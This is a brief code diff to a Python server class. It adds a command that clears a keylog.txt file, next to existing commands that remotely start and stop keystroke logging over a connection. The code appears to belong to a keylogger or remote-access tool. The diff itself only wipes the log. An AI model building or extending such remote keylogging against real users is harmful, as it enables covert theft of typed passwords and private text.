@@ -346,6 +346,10 @@ class Server:
         self.listener.stop()
         pass
     
+    def clear_keylog(self):
+        with open("keylog.txt", "w") as log_file:
+            log_file.write("")
+
     def keylog(self, conn):
         # self.tklog = threading.Thread(target=Keylog.startKLog)
         # self.tklog.start()
@@ -360,6 +364,8 @@ class Server:
                 self.start_keylog()
             elif s == "UNHOOK":
                 self.stop_keylog()
+            elif s == "CLEAR":
+                self.clear_keylog()
             elif s == "QUIT":
                 conn.close()
                 return
